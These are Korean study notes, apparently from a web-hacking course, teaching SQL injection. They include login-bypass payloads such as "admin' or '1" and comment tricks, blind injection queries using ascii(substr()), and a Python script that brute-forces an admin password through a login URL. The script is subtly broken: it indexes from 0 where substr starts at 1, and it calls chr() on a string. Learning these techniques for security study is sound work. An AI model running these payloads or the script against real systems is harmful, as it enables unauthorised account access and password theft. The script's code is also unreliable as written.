## SQL Injection

웹 서비스는 이용자의 입력을 SQL 구문에 포함해 요청하는 경우가 있습니다. 예를 들면, 로그인 시 ID/PW나 게시판에서 게시글의 제목과 내용을 SQL 구문에 포함합니다.

이때 SQL 구문에 조작된 쿼리를 삽입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 행위를 `SQL Injection`이라고 합니다. 

#

#### 로그인 기능을 위한 쿼리

```sql
/*
아래 쿼리 질의는 다음과 같은 의미를 가지고 있습니다.
- SELECT: 조회 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블 에서 데이터를 조회할 것이라고 지정
- WHERE user_id='dreamhack' and user_pw='password': user_id 컬럼이 dreamhack이고, user_pw 컬럼이 password인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 저장된 accounts 테이블에서 이용자의 아이디가 dreamhack이고, 비밀번호가 password인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='dreamhack' and user_pw='password'
```

쿼리문을 살펴보면 이용자가 입력한 `"dreamhack"`과 `"password"` 문자열이 SQL 구문에 포함되어 있습니다.

#

#### SQL Injection으로 조작한 쿼리

```sql
/*
아래 쿼리 질의는 다음과 같은 의미를 가지고 있습니다.
- SELECT: 조회 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블 에서 데이터를 조회할 것이라고 지정
- WHERE user_id='admin': user_id 컬럼이 admin인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 저장된 accounts 테이블에서 이용자의 아이디가 admin인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='admin'
```

쿼리문을 살펴보면, `user_pw` 조건문이 사라진것을 확인할 수 있는데, 조작한 쿼리를 통해 질의하면 DBMS는 비밀번호를 비교하지 않고 해당 계정의 정보를 반환하기 때문에, admin계정으로 로그인할 수 있습니다.


<br>
<br>


### Simple SQL Injection

실습 목표는 질의를 통해 `admin` 결과를 반환하는 것입니다.

**user_table**

| uid | upw |
| --- | --- |
| guest | guest |
| admin | ********** |

`SQL Injection` 공격에서 제일 중요한 것은 이용자의 입력값이 `SQL` 구문으로 해석되도록 해야 합니다. 이를 위해 `'` 문자를 사용하겠습니다.

#

uid에 admin or 1을 입력하고 비밀번호를 입력하지 않았을 때 생성되는 쿼리문은 다음과 같습니다.

```sql
SELECT * FROM user_table WHERE uid='admin' or '1' and upw='';
```

or '1'이라는 조건에 의해 앞에 식이 참이니 uid가 admin인 데이터를 반환하게 되어 관리자 계정으로 로그인할 수 있습니다.

#

이외에도 주석 (--, #, /**/)을 사용하는 방법이 있습니다.

```sql
SELECT * FROM user_table WHERE uid='admin'-- ' and upw='';
```

<br>

#### admin의 upw를 알아내는 공격 쿼리문

![image](https://user-images.githubusercontent.com/81484874/192997338-7200f766-8285-4b07-99e8-8e7730a9049a.png)

![image](https://user-images.githubusercontent.com/81484874/192997365-42d7e5db-a4d5-424b-bfbf-84516ac5d146.png)

![image](https://user-images.githubusercontent.com/81484874/192997383-27f818ea-cdd4-4283-bb25-06f6c12092d2.png)


<br>
<br>


## Blind SQL Injection

SQL Injection을 통해 인증 우회 이외에도 데이터베이스의 데이터를 알아낼 수 있습니다. 이때 사용할 수 있는 공격 기법으로는 Blind SQL Injection이 있습니다. 해당 공격 기법은 스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있습니다.

#

#### 계정 정보 탈취 예시

* Question #1. dreamhack 계정의 비밀번호 첫 번째 글자는 'x' 인가요?
  * Answer. 아닙니다
* Question #2. dreamhack 계정의 비밀번호 첫 번째 글자는 'p' 인가요?
  * Answer. 맞습니다 (첫 번째 글자 = p)
* Question #3. dreamhack 계정의 비밀번호 두 번째 글자는 'y' 인가요?
  * Answer. 아닙니다.

위에 처럼 DBMS가 답변 가능한 형태로 질문하면서 dreamhack 계정의 비밀번호를 알아낼 수 있습니다.
이처럼 질의 결과를 이용자가 화면에 직접 확인하지 못할 때 참/거짓 반환 결과로 데이터를 흭득하는 공격 기법을 Blind SQL Injection 기법이라고 합니다.

<br>

### Blind SQL Injection

#### Blind SQL Injection 공격 쿼리

**ascii 함수**

전달된 문자를 아스키 형태로 반환하는 함수입니다.
Ex) ascii('a')를 실행하면 97이 반환됩니다.

#

**substr**

문자열에서 지정한 위치로부터 길이까지의 값을 가져옵니다.

```python
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

#

#### Blind SQL Injection 공격 쿼리

```sql
# 첫 번째 글자 구하기 (아스키 114 = 'r', 115 = 's'')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True

# 두 번째 글자 구하기 (아스키 115 = 's', 116 = 't')
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True 
```

upw의 첫 번째 값을 아스키 형태로 변환한 값이 114('r') 또는 115('s')인지 질의합니다. 질의 결과는 로그인 성공 여부로 참/거짓을 판단할 수 있습니다. 만약 로그인이 실패할 경우 첫 번째 문자가 'r'이 아님을 의미합니다. 이처럼 쿼리문의 반환 결과를 통해 admin 계정의 비밀번호를 획득할 수 있습니다.


<br>
<br>


## Blind SQL Injection 공격 스크립트

스크립트 작성에 앞서 유용한 라이브러리를 알아보면, requests 모듈이 있습니다. 해당 모듈은 HTTP 요청을 보내고 응답을 확인할 수 있습니다.

#

#### requests 모듈 GET 예제 코드

```python
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)
```

requests.get은 GET 메소드를 사용해 HTTP 요청을 보내는 함수로, URL과 Header, Parameter와 함께 요청을 전송할 수 있습니다.

#

#### request 모듈 POST 예제 코드

```python
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

requests.post는 POST 메소드를 사용해 HTTP 요청을 보내는 함수로 URL과 Header, Body와 함께 요청을 전송할 수 있습니다.


<br>


### Blind SQL Injection 공격 스크립트 작성

```python
#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```

* 코드를 살펴보면, 비밀번호에 포함될 수 있는 문자를 string 모듈을 사용해 생성하고, 한 바이트씩 모든 문자를 비교하는 반복문을 작성합니다.
* 반복문 실행 중에 반환 결과가 참일 경우에 페이지에 표시되는 “Login success” 문자열을 찾고, 해당 결과를 반환한 문자를 password 변수에 저장합니다.
* 반복문을 마치면 “admin” 계정의 비밀번호를 알아낼 수 있습니다.








